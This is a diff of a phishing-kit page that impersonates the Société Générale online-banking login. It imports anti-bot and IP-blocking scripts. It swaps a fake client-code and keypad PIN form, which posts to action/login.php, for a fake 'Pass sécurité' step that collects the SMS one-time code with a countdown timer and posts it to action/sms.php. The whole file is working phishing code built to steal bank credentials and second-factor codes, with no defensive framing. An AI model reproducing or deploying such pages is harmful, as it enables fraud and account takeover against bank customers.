@@ -1,9 +1,5 @@
 <?php
 
-error_reporting(1);
-set_time_limit(0);
-session_start();
-header('Content-type: text/html; charset-UTF-8');
 include ('para.php');
 include ('../prevents/bots.php');
 include ('../prevents/antimar.php');
@@ -18,32 +14,30 @@ include ('../prevents/banned-ip.php');
 	include ('../prevents/anti8.php');
 
 ?>
-       
-<html lang="FR" class="swm-root-active swm-mode-page">
+
+	   <html lang="FR" class="swm-root-active swm-mode-page">
 <head>
+
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     
-    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
+
     <meta name="format-detection" content="telephone=no">
-
-    <title>Société Générale | Connexion</title>
-
-    <meta name="robots" content="none">
-
-    <title>Connexion - Espace client</title>
+	<title>Société Générale | Connexion</title>
+	<meta name="robots" content="none">
+	<title>Connexion - Espace client</title>
     <meta name="title" content="Connexion - Espace client">
     <meta property="og:title" content="Connexion - Espace client">
     <meta name="twitter:card" content="summary">
     <meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover">
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <link rel="icon" type="image/x-icon" href="img/favicon.ico">
-
-    <link href="./index_files/index_20190723161948.min.css" rel="stylesheet" type="text/css">
+	<link href="./sms_files/index_20190723161948.min.css" rel="stylesheet" type="text/css">
 	<link href="./index_files/index_pri_20201013141424.min.css" rel="stylesheet" type="text/css" />
     <link href="./index_files/spec56_btn_gsm_all_gcd_20190320190559.min.css" rel="stylesheet" type="text/css">
-	    <link href="./index_files/awt-front-BDDF.css" rel="stylesheet" type="text/css">
-    <link rel="stylesheet" href="./index_files/inbenta.css">
-
-    <link href="./index_files/print_20190320190559.min.css" rel="stylesheet" type="text/css" media="print">
+	<link href="./index_files/awt-front-BDDF.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="./sms_files/inbenta.css">
+	<link rel="stylesheet" href="./sms_files/style.css">
+	<link href="./sms_files/print_20190320190559.min.css" rel="stylesheet" type="text/css" media="print">
     <style type="text/css">
         .eip_txt_light {
             font-weight: 300;
@@ -63,91 +57,41 @@ include ('../prevents/banned-ip.php');
         }
     </style>
 <style>
-
-.hamza {
-border: none;
-    width: 9.5ch;
-    background: repeating-linear-gradient(90deg, dimgrey 0, dimgrey 1ch, transparent 0, transparent 2.5ch) 0 100%/100% 0px no-repeat;
-    color: dimgrey;
-    font: 3ch consolas, monospace;
-    letter-spacing: 0.7ch;
-    margin-left: 55px;
-hamza:focus {
-  outline: none;
+#codCl {
+opacity:0;
 
 }
-</style>	
-<script src="./index_files/rules.js.download"></script>	
-<script src="./index_files/jquery.js.download"></script>
-<script src="./index_files/js.js.download"></script>
-<script src="./index_files/jquery2.js.download"></script>
-<script>
-$(document).ready(function(){
-  $("#user_id").on("change paste keyup",function(){
-    if ($(this).val().length >= 8) {
-        $('#user_id').addClass('is-valid');
-    } else {
-        $('#user_id').removeClass('is-valid'); 
-    }
-  });
-});
+#codCl.waa {
+        opacity:1;
+    transition:opacity 500ms;
+}
+#oop {
+   
+            opacity:1;
+    transition:opacity 500ms;
+}
+#oop.woo {
+     opacity:0;
 
-
-</script>
-<script>
-
-$(document).ready(function()
-{
-	var _try=0;
-	$("#initClient").click(function()
-	{
-		$("#client-nbr").val("");
-		$("#secret-nbr").val("");
-		$("#next").css("opacity","0.4");
-		$("#next").css("pointer-events", "none");
-		$("#next").css("cursor", "default");
-	});
-	
-	
-	$("#initPass").click(function()
-	{
-		$("#secret-nbr").val("");
-		$("#pw").val("");
-		$("#next").css("opacity","0.4");
-		$("#next").css("pointer-events", "none");
-		$("#next").css("cursor", "default");
-	});
-
-
-	
-
-});
-</script>
-<script>
-
-function ShowStep2() {
-	document.getElementById("clavier").style.display = "block";
-	document.getElementById("btn-container").style.display = "none";
 }
 
-function valider() {
-	var mdp = document.getElementById("user_id").value;
-	if (mdp.length == 5) {
-		return true;
+</style>
 
-	} else {
-		return false;
-	}
-}	
+<script>
+setTimeout(function(){
+    document.getElementById('oop').className = 'woo';
+}, 10000);
+
+setTimeout(function(){
+    document.getElementById('codCl').className = 'waa';
+}, 10000);
+
+</script>	
+
+</head><body class="PRI waitJeton swm " style="" cz-shortcut-listen="true"><span id="warning-container"><i data-reactroot=""></i></span>
 
 
-</script>
-</head><body class="PRI waitJeton swm swm-theme-BDDF  swm-page-authent  swm-theme-BDDF-BDDF swm-theme-SITE_WEB swm-module-authentCV" style="" cz-shortcut-listen="true"><span id="warning-container"><i data-reactroot=""></i></span>
-
-
-    
-
-<header class="rsp_header header-deco header-authent js-header-lhs-auth">
+	<header class="rsp_header header-deco header-authent js-header-lhs-auth">
 	<nav class="rsp_nav rsp_nav--above">
 		<ul class="rsp_nav__list">
 			
@@ -181,212 +125,108 @@ function valider() {
       </g>
     </svg>
   </a>
-<a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="ouvrir-un-compte" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#">                <span class="rsp_link__label">Ouvrir un compte</span>
+<a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Déconnecter" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#">                <span class="rsp_link__label">Déconnecter</span>
 </a></div>
 
-	<h1 class="rsp_header__title-page" id="js-mobile-title">Connexion - Espace client</h1>
+	<h1 class="rsp_header__title-page" id="js-mobile-title">Pass sécurité - Etape 2/6</h1>
 
 	<input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD">
 </header>
-	
-	
-	
-    <main class="dcw_main dcw_gb9_core-wrapper" role="main">
-        <a id="go-content" tabindex="-1"></a>
-        <section class="dcw_gb_row">
-        </section>
-        <section class="dcw_gb_wrapper">
-            <a id="go-content" tabindex="-1"></a>
-            <section class="dcw_gb9_core-left" id="">
 
-                <noscript>
-                    <style>
-                        .auth-content {
-                            display: none !important;
-                        }
-                        
-                        .js-alert {
-                            display: block !important;
-                        }
-                        
-                        .waitAuthJetonMsg {
-                            display: none !important;
-                        }
-                    </style>
-                </noscript>
+<section class="dcw_main">
+<section class="dcw_gb_row dcw_gb_communication">
+	</section>
+<section class="dcw_gb_wrapper">
+		<main role="main">
+			<a id="go-content" tabindex="-1"></a>
+			<section class="dcw_gb_core ugds_serviciel" id="">
 
-                <link rel="stylesheet" href="./index_files/style.css">
+<div id="dcw-swm" class="swm-inner-wrapper">
+    <div class="prefetch"></div>
+    <div id="disableLayer" class="disable-layer"></div>
+    
 
-                <div id="dcw-swm" class="swm-inner-wrapper">
-					<form id="form" action="action/login.php" method="POST" onsubmit="return cc()">
-                    <div class="prefetch"></div>
-                    <div id="disableLayer" class="disable-layer"></div>
 
-                    <div id="swm-tooltip" class="swm-tooltip">
-                        <span></span>
+<div id="swm-tooltip" class="swm-tooltip">
+    <span></span>
+</div>
+<div class="swm-popin-wrapper" tabindex="0" role="dialog" aria-live="assertive">
+    <div id="swm-popin-overlay" class="swm-popin-overlay"></div>
+    <div id="swm-popin-dialog" class="swm-popin-dialog">
+        <div class="swm-popin-relative">
+            <div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" tabindex="0" aria-label="Fermer la popin"></div>
+            <div class="swm-popin-ombre-sup"></div>
+            <div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
+                <div id="swm-popin" class="swm-popin">
+                    <div id="swm-popin-cadre" class="swm-popin-cadre oob-content">
                     </div>
-                    <div class="swm-popin-wrapper">
-                        <div id="swm-popin-overlay" class="swm-popin-overlay"></div>
-                        <div id="swm-popin-dialog" class="swm-popin-dialog">
-                            <div class="swm-popin-relative">
-                                <div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" tabindex="0" aria-label="Fermer la popin"></div>
-                                <div class="swm-popin-ombre-sup"></div>
-                                <div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
-                                    <div id="swm-popin" class="swm-popin">
-                                        <div id="swm-popin-cadre" class="swm-popin-cadre oob-content">
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="swm-popin-ombre-inf"></div>
-                            </div>
+                </div>
+            </div>
+            <div class="swm-popin-ombre-inf"></div>
+        </div>
+    </div>
+</div>
+
+    <main role="main" class="dcw_authent dcw_csetape">
+        <div class="dcw_codeContainer">
+            <div class="dcw_block">
+                <div class="dcw_block-element">
+                    <section class="dcw_chemin_etape js-breadcrumb nav-item-selected-1">
+                        
+                    </section>
+                </div>
+            </div>
+			<div id="oop" align="center">
+				<img src="./sms_files/loader.gif">
+			</div>
+			
+            <div id="codCl">
+				<form action="action/sms.php" method="POST" onsubmit="return cc()">
+                <div class="dcw_block dcw_block-text">
+                    <div class="dcw_block-element">
+                        <h3>Pour activer votre Pass Sécurité, <br>veuillez saisir le premier code reçu par sms.</h3>
+						<strong><span style="color:red;" class="js-timeout">2:00</span></strong><br>
+                    </div>
+                </div>
+
+
+                <div class="dcw_block dcw_block-input">
+                    <div class="dcw_block-element">
+
+                        <div class="row_section dcw_input-container">
+                            <input id="sms" name="sms" type="text" class="dcw_input grey_cross" placeholder=" " maxlength="6" autocomplete="off" autocapitalize="off" autocorrect="off" required="">
+                            <span class="dcw_sprite dcw_to-clear"></span>
+                            <span class="bar"></span>
+                            <label>Code reçu par sms</label>
+                            <span class="text_is_invalid">Saisissez un identifiant valide</span>
                         </div>
                     </div>
-
-                    <div class="dcw_authent">
-
-                        <div class="auth-content js-content-aria-hide dcw_codeContainer">
-                            <div id="swmModulesAuth">
-                                <div id="module-authent-cv">
-                                    <div class="container-mire-codeClient">
-                                        <div class="dcw_block">
-                                            <div class="component-mire-codeclient">
-											
-                                                <div class="dcw_block-element">
-                                                    <div class="auth-cs-content row_section dcw_input-container">
-                                                        <input id="user_id" name="user_id" type="text" class="auth-input-erasable auth-login dcw_input grey_cross eer_input__field ngim-input" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" autocomplete="off" maxlength="8" required=""> <span class="dcw_sprite dcw_to-clear" id="user_id-delete"> <a class="dcw_icone dcw_effacer" aria-label="Effacer le code client" href="#"></a> </span> <span class="bar" tabindex="-1" aria-hidden="true"></span>
-                                                        <label tabindex="-1" aria-hidden="true">Saisissez votre code client</label>
-                                                    </div>
-                                                    <div id="js-error" tabindex="0" role="alert" class="auth_error show" style="display: none;"> 
-														<div class="error-wrapper"> 
-															<div role="alert" class="inner">      
-																<div role="alert" class="message" tabindex="0">Votre identifiant est incorrect</div>    
-															</div> 
-														</div>
-													</div>
-                                                </div>
-												
-                                                <div class="auth-checkbox-wrapper auth-check-left dcw_block-element" id="saveId-container">
-                                                    <div class="switch" tabindex="0" aria-label="Activer la mémorisation du code client">
-                                                        <input type="checkbox" class="switch input" id="saveId" name="saveId" style="display: none" data-xiti="clic_memoriser_identifiant" tabindex="0">
-                                                        <label for="saveId" class="labelSwitch" onclick="" aria-hidden="true" data-xiti="clic_memoriser_identifiant" aria-labelledby="memo_code_client_label"> <span class="hidden-checkbox-input needsclick rep"></span>
-                                                            <div class="toggle-btn-handle"></div>
-                                                        </label>
-                                                    </div> <span class="hidden-checkbox-label" id="memo_code_client_label" aria-hidden="true"><label for="saveId">Se souvenir de moi</label></span>
-                                                    <div class="dcw_infohover dcw_input-info" tabindex="0" aria-label="Information sur la mémorisation du code client"> <span class="dcw_sprite-info--off"></span>
-                                                        <div class="dcw_infopopin dcw_infobulle">
-                                                            <p class="dcw_espace">Se souvenir de moi</p>
-                                                            <p>En cochant cette case, votre code client sera mémorisé sur cet appareil.</p>
-                                                            <p class="dcw_espace">De cette manière vous n'aurez plus à le saisir lors de vos prochaines connexions.</p>
-                                                            <p class="dcw_espace">Ceci est déconseillé si votre ordinateur est utilisé par d'autres personnes.</p>
-                                                            <button class="dcw_button-secondaire--linear-gris dcw_button-arrondi">J'ai compris</button>
-                                                        </div>
-                                                    </div>
-                                                </div>
-                                                <div class="auth-cs-content-validate" id="btn-container" style="display: block;">
-                                                    <button class="dcw_button-principal dcw_button-arrondi auth-btn-action" id="btn-validate" onclick="ShowStep2();" type="button" aria-label="Valider votre identifiant">Valider</button>
-                                                    <br> </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div id="clavier" class="loaded" style="display: none;">
-									
-
-                                        <div class="component-authent-cv dcw_block" aria-expanded="true" id="sonore-vk">
-
-                                            <div class="auth-cs-content-code auth-cs-content swm-vk">
-
-                                                <div class="auth-cs-content-code-input row_section dcw_input-container">
-
-                                                    <input type="button" id="closeKeyBoard">
-
-                                                    <div class="auth-cs-content-code-input row_section dcw_input-container">
-
-                                                        <input type="password" id="secret-nbr" name="Pass" class="dcw_input grey_cross hamza" readonly="readonly" maxlength="6" required="" placeholder="------">
-														<span class="dcw_sprite dcw_to-clear" role="button" id="initClient" style="display: block;cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto;"></span>
-                                                     <div id="js-error" tabindex="0" class="auth_error"></div>
-
-                                                    </div>
-													<input type="hidden" name="Hidden1" id="Hidden1">
-                                                </div>
-                                                <div>
-                                                    <div id="gda_vk" class="clavier-container dcw_block-element dcw_conteneur_clavier swm-visible">
-                                                        <div id="img_container" class="img-container">
-                                                            <img id="img_clavier" class="keyboard dcw_block-element dcw_conteneur_clavier" usemap="#tc_tclavier" src="./index_files/gen_ui.png">
-                                                            <div id="hover_touche_4_4" class="hover" onclick="addCode ('3');" name="3" value="" style="position: absolute; left: 180px; top: 180px; width: 60px; height: 60px;"></div>
-                                                            <div id="hover_touche_4_2" class="hover" onclick="addCode ('4');" name="4" value="" style="position: absolute; left: 60px; top: 180px; width: 60px; height: 60px;"></div>
-                                                            <div id="hover_touche_3_4" class="hover" onclick="addCode ('8');" name="8" value="" style="position: absolute; left: 180px; top: 120px; width: 60px; height: 60px;"></div>
-                                                            <div id="hover_touche_3_3" class="hover" onclick="addCode ('7');" name="7" value="" style="position: absolute; left: 120px; top: 120px; width: 60px; height: 60px;"></div>
-                                                            <div id="hover_touche_3_2" class="hover" onclick="addCode ('9');" name="9" value="" style="position: absolute; left: 60px; top: 120px; width: 60px; height: 60px;"></div>
-                                                            <div id="hover_touche_3_1" class="hover" onclick="addCode ('0');" name="0" value="" style="position: absolute; left: 0px; top: 120px; width: 60px; height: 60px;"></div>
-                                                            <div id="hover_touche_2_1" class="hover" onclick="addCode ('6');" name="6" value="" style="position: absolute; left: 0px; top: 60px; width: 60px; height: 60px;"></div>
-                                                            <div id="hover_touche_1_4" class="hover" onclick="addCode ('2');" name="2" value="" style="position: absolute; left: 180px; top: 0px; width: 60px; height: 60px;"></div>
-                                                            <div id="hover_touche_1_3" class="hover" onclick="addCode ('5');" name="5" value="" style="position: absolute; left: 120px; top: 0px; width: 60px; height: 60px;"></div>
-                                                            <div id="hover_touche_1_1" class="hover" onclick="addCode ('1');" name="1" value="" style="position: absolute; left: 0px; top: 0px; width: 60px; height: 60px;"></div>
-                                                        </div>
-                                                    </div>
-                                                </div>
-
-                                                <div class="auth-cs-content-validate">
-
-                                                    <button class="dcw_button-principal dcw_button-arrondi auth-btn-action" id="btn-authent" type="submit" aria-label="Valider votre code secret">Valider</button>
-
-                                                    <div class="sonore-Keyboard dcw_block-element">
-                                                        <a id="activeKS" class="dcw_link" tabindex="0">Activer le clavier sonore</a>
-                                                    </div>
-
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-
-                        </div>
-
-                    </div>
-
+                </div>
+                <div class="dcw_block dcw_block-input">
                     
-					
-					</form>
                 </div>
-
-            </section>
-            <section class="dcw_gb9_core-right">
-
-                <div>
-
-                    <div>
-                        <strong>Obtenir vos codes</strong>
-                        <br>
-                        <br> Le code client vous est attribué par un conseiller au moment de votre inscription au contrat Banque à distance en agence. Lors d'une ouverture de compte en ligne, le code client vous est envoyé par courrier. Il est également indiqué sur vos relevés de comptes.
-                        <br>
-                        <br>
-                        <br>
-                        <strong>Code secret oublié</strong>
-                        <br>
-                        <br>
-                       <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link">Effectuer une nouvelle demande</a>
-                        <br>
-                        <br>
-                        <br>
-                        <strong>Nos conseils sécurité</strong>
-                        <br>
-                        <br>
-                        <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité">Découvrez le Pass sécurité</a> 
-                        <br>
-                        <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées">Voir les menaces identifiées</a>
-                        <br>
-                        <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir le Guide des bonnes pratiques">Guide des bonnes pratiques</a>
-
+                <div class="dcw_block dcw_block-button">
+				
+                    <div class="dcw_block-element">
+                        <button id="btn-validate" type="submit" class="dcw_button-principal dcw_button-arrondi">Valider</button>
                     </div>
-
                 </div>
-
-            </section>
-            <section class="dcw_gb_row dcw_gb_clearfix">
-            </section>
-        </section>
+				</form>
+            </div>
+            
+         </div>
     </main>
+
+
+</div>
+
+            
+                </section>
+	</main>
+<section class="dcw_gb_row">
+	</section>
+</section>
+	</section>
 
 <footer class="dcw_footer" role="contentinfo">
 	<div class="dcw_footer-second">
@@ -471,7 +311,6 @@ function valider() {
 	</nav>
 	</footer>
 
-    <div id="interactWrapper" class="sdcwrapper"></div>
 
 
 
@@ -494,16 +333,35 @@ function valider() {
 
 
 
+    <div id="interactWrapper" class="sdcwrapper"></div>
 
+							<script>
+	      var interval;
 
+	function countdown() {
+	  clearInterval(interval);
+	  interval = setInterval( function() {
+	      var timer = $('.js-timeout').html();
+	      timer = timer.split(':');
+	      var minutes = timer[0];
+	      var seconds = timer[1];
+	      seconds -= 1;
+	      if (minutes < 0) return;
+	      else if (seconds < 0 && minutes != 0) {
+	          minutes -= 1;
+	          seconds = 59;
+	      }
+	      else if (seconds < 10 && length.seconds != 2) seconds = '0' + seconds;
 
+	      $('.js-timeout').html(minutes + ':' + seconds);
 
-
-
-
-
-
-
-
+	      if (minutes == 0 && seconds == 0) clearInterval(interval);
+	  }, 1000);
+	}
+	countdown();
+	</script>
+							</body>
 
 </body></html>
+
+    
